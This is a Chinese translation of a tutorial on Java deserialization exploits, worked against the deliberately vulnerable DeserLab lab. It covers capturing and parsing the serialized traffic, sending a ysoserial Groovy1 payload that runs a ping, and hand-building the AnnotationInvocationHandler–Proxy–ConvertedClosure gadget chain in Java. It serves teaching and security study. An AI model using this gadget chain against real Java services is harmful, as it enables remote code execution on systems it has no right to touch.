> 原文链接: https://www.anquanke.com//post/id/86932 


# 【技术分享】Java反序列化漏洞从理解到实践


                                阅读量   
                                **179441**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：diablohorn.com
                                <br>原文地址：[https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01d79a7cc297825fb8.jpg)](https://p3.ssl.qhimg.com/t01d79a7cc297825fb8.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**

在学习新事物时，我们需要不断提醒自己一点：纸上得来终觉浅，绝知此事要躬行。这也是为什么我们在学到知识后要付诸实践的原因所在。在本文中，我们会深入分析大家非常熟悉的**Java发序列化漏洞**。对我们而言，最好的实践就是真正理解手头掌握的知识，并可以根据实际需要加以改进利用。本文的主要内容包括以下两方面：

**1.    利用某个反序列化漏洞。**

**2.    自己手动创建利用载荷。**

更具体一点，首先我们会利用现有工具来实际操作反序列化漏洞，也会解释操作的具体含义，其次我们会深入分析载荷相关内容，比如什么是载荷、如何手动构造载荷等。完成这些步骤后，我们就能充分理解载荷的工作原理，未来碰到类似漏洞时也能掌握漏洞的处理方法。

整个过程中需要用到的工具都会在本文给出，但我建议你先了解一下这个工具：

https://github.com/NickstaDB/DeserLab

该工具包含我们准备实践的漏洞。之所以选择使用模拟漏洞而不是实际目标，原因在于我们可以从各个方面控制这个漏洞，因此也可以更好理解反序列化漏洞利用的工作原理。

**<br>**

**二、利用DeserLab漏洞**

首先你可以先读一下Nick写的这篇[文章](https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/)， 文章中介绍了**DeserLab**以及Java反序列化相关内容。本文会详细介绍Java序列化协议的具体细节。阅读完本文后，你应该可以自己搞定DeserLab环境。接下来我们需要使用各种预编译jar工具，所以我们可以先从[Github](https://github.com/NickstaDB/)上下载这些工具。现在准备步入正题吧。

碰到某个问题后，我通常的做法是先了解目标的正常工作方式。对于DeserLab来说，我们需要做以下几件事情：

**运行服务器及客户端**

**抓取通信流量<br>**

**理解通信流量**

我们可以使用如下命令来运行服务器及客户端：



```
java -jar DeserLab.jar -server 127.0.0.1 6666
java -jar DeserLab.jar -client 127.0.0.1 6666
```

上述命令的运行结果如下：



```
java -jar DeserLab.jar -server 127.0.0.1 6666
[+] DeserServer started, listening on 127.0.0.1:6666
[+] Connection accepted from 127.0.0.1:50410
[+] Sending hello...
[+] Hello sent, waiting for hello from client...
[+] Hello received from client...
[+] Sending protocol version...
[+] Version sent, waiting for version from client...
[+] Client version is compatible, reading client name...
[+] Client name received: testing
[+] Hash request received, hashing: test
[+] Hash generated: 098f6bcd4621d373cade4e832627b4f6
[+] Done, terminating connection.
java -jar DeserLab.jar -client 127.0.0.1 6666
[+] DeserClient started, connecting to 127.0.0.1:6666
[+] Connected, reading server hello packet...
[+] Hello received, sending hello to server...
[+] Hello sent, reading server protocol version...
[+] Sending supported protocol version to the server...
[+] Enter a client name to send to the server:
testing
[+] Enter a string to hash:
test
[+] Generating hash of "test"...
[+] Hash generated: 098f6bcd4621d373cade4e832627b4f6
```

上述结果并不是我们想要的信息，我们想问的问题是，这个环境如何实现反序列化功能？为了回答这个问题，我们可以使用wireshark、tcpdump或者tshark来捕捉6666端口上的流量。我们可以使用如下命令，利用tcpdump来捕捉流量：

```
tcpdump -i lo -n -w deserlab.pcap 'port 6666'
```

在继续阅读本文之前，你可以先用wireshark来浏览一下pcap文件。读完Nick的文章后，你应该已经了解目前所处的状况，至少能够识别出隐藏在流量中的序列化Java对象。

[![](https://p2.ssl.qhimg.com/t0177915cf2e7b4ea3a.png)](https://p2.ssl.qhimg.com/t0177915cf2e7b4ea3a.png)

**2.1 提取序列化数据**

根据这些流量，我们可以肯定的是网络中有序列化数据正在传输，现在让我们来分析哪些数据正在传输。我选择使用[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)工具来解析这些流量，这个工具属于我们要用的工具集之一，作用与[**jdeserialize**](https://github.com/frohoff/jdeserialize/tree/master/jdeserialize)类似，后者属于闻名已久且尚能发挥作用的老工具。在使用这些工具之前，我们需要先准备好待处理数据，因此，我们需要将pcap转换为可待分析的数据格式。

```
tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d',' -f2 | tr 'n' ':' | sed s/://g
```

这条命令虽然看起来很长，但至少能正常工作。我们可以将这条命令分解为更好理解的子命令，因为该命令的功能是将pcap数据转换为经过十六进制编码的一行输出字符串。首先，该命令将pcap转换为文本，文本中只包含传输的数据、TCP源端口号以及目的端口号：

```
tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,
```

结果如下所示：



```
50432,,6666
6666,,50432
50432,,6666
50432,aced0005,6666
6666,,50432
6666,aced0005,50432
```

如上述结果所示，在TCP三次握手期间并没有传输数据，因此你可以看到',,'这样一段文本。随后，客户端发送第一个字节，服务器返回ACK报文，然后再发回某些字节数据，以此类推。命令的第二个功能是继续处理这些文本，根据端口以及每一行的开头部分来选择输出合适的载荷：

```
| grep -v ',,' | grep '^6666,' | cut -d',' -f2 | tr 'n' ':' | sed s/://g
```

这条过滤命令会将服务器的响应数据提取出来，如果你想要提取客户端数据，你需要改变端口号。处理结果如下所示：

```
aced00057704f000baaa77020101737200146e622e64657365722e486[...]
```

这些数据正是我们需要的数据，它将发送和接收数据以较为简洁的方式表示出来。我们可以使用前面提到的两个工具来处理这段数据，首先我们使用的是SerializationDumper，然后我们会再使用jdeserialize。之所以要这么做，原因在于使用多个工具来处理同一个任务可以便于我们分析潜在的错误或问题。如果你坚持使用一个工具的话，你可能会不小心走进错误的死胡同。当然尝试不同的工具本身就是一件非常有趣的事情。

**2.2 分析序列化数据******

SerializationDumper工具的使用非常简单直白，我们只需要将十六进制形式的序列化数据作为第一个参数传输进去即可，如下所示：

```
java -jar SerializationDumper-v1.0.jar aced00057704f000baaa77020101
```

结果如下所示：



```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
TC_BLOCKDATA - 0x77
Length - 4 - 0x04
Contents - 0xf000baaa
TC_BLOCKDATA - 0x77
Length - 2 - 0x02
Contents - 0x0101
TC_OBJECT - 0x73
TC_CLASSDESC - 0x72
className
Length - 20 - 0x00 14
Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374
```

我们需要编译才能使用jdeserialize工具。编译任务可以使用[ant](http://ant.apache.org/)以及build.xml文件来完成，我选择手动编译方式，具体命令如下：



```
mkdir build
javac -d ./build/ src/*
cd build
jar cvf jdeserialize.jar *
```

上述命令可以生成jar文件，你可以使用如下命令输出帮助信息以测试jar文件是否已正确生成：

```
java -cp jdeserialize.jar org.unsynchronized.jdeserialize
```

jdeserialize工具需要一个输入文件，因此我们可以使用python之类的工具将十六进制的序列化数据保存成文件，如下所示（我缩减了十六进制字符串以便阅读）：

```
open('rawser.bin','wb').write('aced00057704f000baaa77020146636'.decode('hex'))
```

接下来，我们使用待处理文件名作为第一个参数，传递给jdeserialize工具，处理结果如下所示：



```
java -cp jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin
read: [blockdata 0x00: 4 bytes]
read: [blockdata 0x00: 2 bytes]
read: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;
//// BEGIN stream content output
[blockdata 0x00: 4 bytes]
[blockdata 0x00: 2 bytes]
nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;
//// END stream content output
//// BEGIN class declarations (excluding array classes)
class nb.deser.HashRequest implements java.io.Serializable `{`
java.lang.String dataToHash;
java.lang.String theHash;
`}`
//// END class declarations
//// BEGIN instance dump
[instance 0x7e0002: 0x7e0000/nb.deser.HashRequest
field data:
0x7e0000/nb.deser.HashRequest:
dataToHash: r0x7e0003: [String 0x7e0003: "test"]
theHash: r0x7e0004: [String 0x7e0004: "098f6bcd4621d373cade4e832627b4f6"]
]
//// END instance dump
```

从这两个分析工具的输出中，我们首先可以确认的是，这段数据的确是序列化数据。其次，我们可以确认的是，客户端和服务器之间正在传输一个“nb.deser.HashRequest”对象。结合工具的输出结果以及前面的wireshark抓包数据，我们可知用户名以字符串形式存储在TC_BLOCKDATA类型中进行传输：



```
TC_BLOCKDATA - 0x77
Length - 9 - 0x09
Contents - 0x000774657374696e67
'000774657374696e67'.decode('hex')
'x00x07testing'
```

现在我们对DeserLab客户端与服务器之间的通信过程已经非常熟悉，接下来我们可以使用ysoserial工具来利用这个过程。

**2.3 利用DeserLab中的漏洞**

根据pcap的分析结果以及序列化数据的分析结果，我们已经非常熟悉整个环境的通信过程，因此我们可以构建自己的python脚本，脚本中可以嵌入ysoserial载荷。为了保持代码的简洁，也为了匹配wireshark数据流，我决定使用类似wireshark数据流的方式来实现这段代码，如下所示：



```
mydeser = deser(myargs.targetip, myargs.targetport)
mydeser.connect()
mydeser.javaserial()
mydeser.protohello()
mydeser.protoversion()
mydeser.clientname()
mydeser.exploit(myargs.payloadfile)
```

你可以在[这里](https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7)找到完整版的代码。 如你所见，最简单的方法是将所有java反序列化交换数据硬编码到代码中。你可能对代码的具体写法有些疑问，比如为什么`mydeser.exploit(myargs.payloadfile)`位于`mydeser.clientname()`之后，以及我根据什么来决定代码的具体位置。因此我想解释一下我的思考过程，也顺便介绍一下如何生成并发送ysoserial载荷。

在读完有关Java反序列化的几篇文章之后（见本文的参考资料），我总结了两点思想：

1、大多数漏洞都与Java对象的反序列化有关。

2、大多数漏洞都与Java对象的反序列化有关。

开个玩笑而已。所以如果我们检查服务器与客户端的信息交互过程，我们可以在某个地方找到Java对象的交换过程。我们很容易就能在序列化数据的分析结果中找到这个目标，因为它要么包含“TC_OBJECT – 0x73”特征，要么包含如下数据：



```
//// BEGIN stream content output
[blockdata 0x00: 4 bytes]
[blockdata 0x00: 2 bytes]
[blockdata 0x00: 9 bytes]
nb.deser.HashRequest _h0x7e0002 = r_0x7e0000; 
//// END stream content output
```

从以上输出中，我们可以看到流数据的最后一部分内容为“nb.deser.HashRequest”对象。读取这个对象的位置正是交换过程的最后一部分，这也解释了为什么漏洞利用函数位于代码的末尾。现在我们已经知道漏洞利用载荷的存放位置，我们怎么样才能生成并发送载荷呢？

DeserLab本身的代码其实没有包含任何可利用的东西，具体原因下文会解释，现在我们只需要接受这个事实即可。这意味着我们需要查找其他程序库，从中挖掘能帮助我们的代码。DeserLab仅仅包含一个Groovy库，这足以给我们足够多的提示来生成ysoserial载荷。在现实世界中，我们往往需要亲自反汇编未知程序库，才能寻找到有用的代码，这些代码也可以称为漏洞利用的小工具（gadget）。

掌握库信息后，载荷的生成就会变得非常简单，命令如下所示：

```
java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' &gt; payload.bin
```

需要注意的是，载荷发送后不会返回任何响应，因此如果我们想确认载荷是否工作正常，我们需要一些方法来检测。在实验环境中，一个ping localhost命令足以，但在实际环境中，我们需要找到更好的方式。

现在万事俱备，是不是只需要发送载荷就可以大功告成？差不多是这个样子，但我们不要忘了Java序列化头部交换过程在这之前已经完成，这意味着我们需要剔除载荷头部的前4个字节，然后再发送载荷：



```
./deserlab_exploit.py 127.0.0.1 6666 payload_ping_localhost.bin 
2017-09-07 22:58:05,401 - INFO - Connecting
2017-09-07 22:58:05,401 - INFO - java serialization handshake
2017-09-07 22:58:05,403 - INFO - protocol specific handshake
2017-09-07 22:58:05,492 - INFO - protocol specific version handshake
2017-09-07 22:58:05,571 - INFO - sending name of connected client
2017-09-07 22:58:05,571 - INFO - exploiting
```

如果一切顺利的话，你可以看到如下输出：



```
sudo tcpdump -i lo icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
22:58:06.215178 IP localhost &gt; localhost: ICMP echo request, id 31636, seq 1, length 64
22:58:06.215187 IP localhost &gt; localhost: ICMP echo reply, id 31636, seq 1, length 64
22:58:07.215374 IP localhost &gt; localhost: ICMP echo request, id 31636, seq 2, length 64
```

非常好，我们成功利用了DeserLab的漏洞。接下来我们需要好好理解一下我们发往DeserLab的载荷的具体内容。

**<br>**

**三、手动构建载荷**

想要理解载荷的工作原理，最好的方法就是自己手动重建一模一样的载荷，也就是说，我们需要写Java代码。问题是，我们需要从何处开始？正如我们前面对pcap的分析一样，我们可以观察一下序列化载荷。使用如下这条命令，我们可以将载荷转换为十六进制字符串，然后我们就可以使用SerializationDumper来分析这个字符串，当然如果你喜欢的话，你也可以使用jdeserialize来分析文件。

```
open('payload.bin','rb').read().encode('hex
```

现在我们可以深入分析一下，理解具体的工作过程。话说回来，当理清这些问题后，你可能会找到另一篇文章详细介绍了整个过程，所以如果愿意的话，你可以跳过 这部分内容，直接阅读这篇[文章](https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical)。接下来的文章着重介绍了我所使用的方法。在我使用的方法中，非常重要的一点就是阅读ysoserial中关于这个漏洞利用部分的源码。我不想重复提及这一点，如果你纳闷我怎么找到具体的工作流程，我会让你去阅读ysoserial的实现代码。

将载荷传给工具处理后，这两个工具都会生成非常长的输出信息，包含各种Java类代码。其中我们主要关注的类是输出信息中的第一个类，名为“sun.reflect.annotation.AnnotationInvocationHandler”。这个类看起来非常眼熟，因为它是许多反序列利用代码的入口点。我还注意到其他一些信息，包括“java.lang.reflect.Proxy”、“org.codehaus.groovy.runtime.ConvertedClosure”以及“org.codehaus.groovy.runtime.MethodClosure”。这些类之所以引起我的注意，原因在于它们引用了我们用来利用漏洞的程序库，此外，网上关于Java反序列化漏洞利用的文章中也提到过这些类，我在ysoserial源码中也见过这些类。

我们需要注意一个重要概念，那就是当你在执行反序列化攻击操作时，你发送的实际上是某个对象的“已保存的”状态。也就是说，你完全依赖于接收端的行为模式，更具体地说，你依赖于接收端在反序列化你发送的“已保存的”状态时所执行的具体操作。如果另一端没有调用你所发送的对象中的任何方法，你就无法达到远程代码执行目的。这意味着你唯一能改变的只是操作对象的属性信息。

理清这些概念后我们可知，如果我们想获得代码执行效果，我们所发送的第一个类中的某个方法需要被自动调用，这也解释了为什么第一个类的地位如此重要。如果我们观察[AnnotationInvocationHandler](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b27/sun/reflect/annotation/AnnotationInvocationHandler.java)的代码，我们可以看到其构造函数接受一个java.util.map对象，且readObject方法会调用Map对象上的一个方法。如果你阅读过其他文章，那么你就会知道，当数据流被反序列化时会自动调用readObject方法。基于这些信息，再从其他文章来源借鉴部分代码，我们就可以着手构建自己的漏洞利用代码，如下所示。如果你想理解代码内容，你可以先参考一下Java中的[反射（reflection）](https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful)机制。



```
//this is the first class that will be deserialized
 String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
 //access the constructor of the AnnotationInvocationHandler class
 final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
 //normally the constructor is not accessible, so we need to make it accessible
 constructor.setAccessible(true);
```

你可以使用如下命令来编译并运行这段代码，虽然目前它还没有什么实际功能：



```
javac ManualPayloadGenerateBlog
java ManualPayloadGenerateBlog
```

当你拓展这段代码的功能时，请牢记以下几点：

**碰到错误代码时请及时Google。**

**类名需与文件名保持一致。**

**请熟练掌握Java语言。**

上述代码可以提供可用的初始入口点类以及构造函数，但我们具体需要往构造函数中传递什么参数呢？大多数例子中会使用如下这行代码：

```
constructor.newInstance(Override.class, map);
```

对于“map”参数我的理解是，首次调用readObject期间会调用map对象的“entrySet”方法。我不是特别明白第一个参数的内部工作机制，但我知道readObject方法内部会检查这个参数，以确认该参数为“AnnotionType”类型。我们为该参数提供了一个“Override”类，可以满足类型要求。

现在说到重点了。为了理解程序的工作原理，我们需要注意的是，第二个参数不是一个简单的Java map对象，而是一个Java代理（Proxy）对象。我第一次接触到这个事实时也不明白这有什么具体含义。有一篇[文章](http://www.baeldung.com/java-dynamic-proxies)详细介绍了Java动态代理（Dynamic Proxies）机制的相关内容，也提供了非常好的示例代码。文章部分内容摘抄如下：

“ 通过动态代理机制，仅包含1个方法的单一类可以使用多个调用接口为包含任意多个方法的任意类提供服务。动态代理的作用与封装（Facade）层类似，但你可以把它当成是任意接口的具体实现。抛去外表后，你会发现动态代理会把所有的方法调用导向单独的一个处理程序，即invoke()方法。 ”

简单理解的话，代理对象可以假装成一个Java map对象，然后将所有对原始Map对象的调用导向对另一个类的某个方法的调用。让我们用一张图来梳理一下：

[![](https://p2.ssl.qhimg.com/t01248224b852152157.png)](https://p2.ssl.qhimg.com/t01248224b852152157.png)

这意味着我们可以使用这种Map对象来拓展我们的代码，如下所示：

```
final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] `{`Map.class`}`, &lt;unknown-invocationhandler&gt;);
```

需要注意的是，我们仍然需要匹配代码中的invocationhandler，现在我们还没填充这个位置。这个位置最终由Groovy来填充，目前为止我们仍停留在普通的Java类范围内。Groovy之所以适合这个位置，原因在于它包含一个InvocationHandler。因此，当InvocationHandler被调用时，程序最终会引导我们达到代码执行效果，如下所示：



```
final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("ping 127.0.0.1", "execute"), "entrySet");
final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] `{`Map.class`}`, closure);
```

如你所见，上面代码中我们在invocationhandler填入了一个ConvertedClosure对象。你可以反编译Groovy库来确认这一点，当你观察ConvertedClosure类时，你可以看到它继承（extends ）自ConversionHandler类，反编译这个类，你可以看到如下代码：



```
public abstract class ConversionHandler
 implements InvocationHandler, Serializable
```

从代码中我们可知，ConversionHandler实现了InvocationHandler，这也是为什么我们可以在代理对象中使用它的原因所在。当时我不能理解的是Groovy载荷如何通过Map代理来实现代码执行。你可以使用反编译器来查看Groovy库的代码，但通常情况下，我发现使用Google来搜索关键信息更为有效。比如说，这种情况下，我们可以在Google中搜索如下关键词：

```
“groovy execute shell command”
```

搜索上述关键词后，我们可以找到许多文章来解释这个问题，比如这篇[文章](https://stackoverflow.com/questions/159148/groovy-executing-shell-commands)以及这篇[文章](https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy)。这些解释的要点在于，String对象有一个名为“execute”的附加方法。我经常使用这种查询方法来处理我不熟悉的那些环境，因为对开发者而言，执行shell命令通常是一个刚需，而相关答案又经常可以在互联网上找到。理解这一点后，我们可以使用一张图来完整表达载荷的工作原理，如下所示： 

[![](https://p3.ssl.qhimg.com/t017de88a7a970a158d.png)](https://p3.ssl.qhimg.com/t017de88a7a970a158d.png)

你可以访问[此链接](https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7)获取完整版代码，然后使用如下命令编译并运行这段代码：



```
javac -cp DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate.java 
java -cp .:DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate &gt; payload_manual.bin
```

运行这段代码后，我们应该能够得到与ysoserial载荷一样的结果。令我感到惊奇的是，这些载荷的哈希值竟然完全一样。



```
sha256sum payload_ping_localhost.bin payload_manual.bin 
4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_ping_localhost.bin
4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_manual.bin
```

感谢大家阅读本文，希望以后在利用Java反序列化漏洞的过程中，大家也能更好地理解漏洞利用原理。

**<br>**

**四、参考资料**

https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical

https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/

https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html

http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html

https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478

https://www.youtube.com/watch?v=VviY3O-euVQ

http://wouter.coekaerts.be/2015/annotationinvocationhandler

http://www.baeldung.com/java-dynamic-proxies

https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy

https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful
